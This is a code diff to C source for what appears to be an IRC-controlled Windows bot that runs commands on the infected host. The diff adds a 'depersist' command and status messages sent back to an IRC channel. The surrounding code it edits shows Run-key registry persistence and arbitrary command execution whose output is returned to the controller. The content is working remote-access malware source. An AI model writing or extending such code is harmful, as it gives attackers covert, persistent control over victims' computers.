@@ -97,16 +97,36 @@ void et_main_loop_win(SOCKET socket, char *nick)
 					else if (strstr(cmd, "popup"))
 					{
 						cmd += 6; /* increment past 'popup ' */
-						MessageBox(NULL, cmd, "ET says hi", MB_OK | MB_ICONINFORMATION);
+						MessageBox(NULL, cmd, "ET", MB_OK | MB_ICONINFORMATION);
 					}
 					else if (!strcmp(cmd, "persist"))
 					{
+						char persist_message[IRC_MSGLEN];
+
 						HKEY key = NULL;
 						RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &key, NULL);
 						char path[256];
 						GetModuleFileName(NULL, path, 256);
 						RegSetValueEx(key, "et", 0, REG_SZ, (BYTE *) path, strlen(path));
 						RegCloseKey(key);
+
+						_snprintf(persist_message, IRC_MSGLEN, "PRIVMSG %s :Persist succeeded.\r\n", IRC_CHANNEL);
+						send(socket, persist_message, strlen(persist_message), 0);
+					}
+					else if (!(strcmp(cmd, "depersist")))
+					{
+						char depersist_message[IRC_MSGLEN];
+
+						HKEY key = NULL;
+						RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &key);
+						
+						RegDeleteValue(key, "et");
+						RegDeleteKeyEx(key, "et", KEY_WOW64_32KEY, 0);
+						RegCloseKey(key);
+						_snprintf(depersist_message, IRC_MSGLEN, "PRIVMSG %s :Successfully removed registry key.\r\n", IRC_CHANNEL);
+
+						send(socket, depersist_message, strlen(depersist_message), 0);
+						ZeroMemory(depersist_message, IRC_MSGLEN);
 					}
 					else
 					{
@@ -137,6 +157,7 @@ void et_main_loop_win(SOCKET socket, char *nick)
 						send(socket, cmd_message, strlen(cmd_message), 0);
 						_pclose(output_file);
 						ZeroMemory(cmd_output, IRC_MSGLEN);
+						ZeroMemory(cmd_message, IRC_MSGLEN);
 					}
 				}
 			}
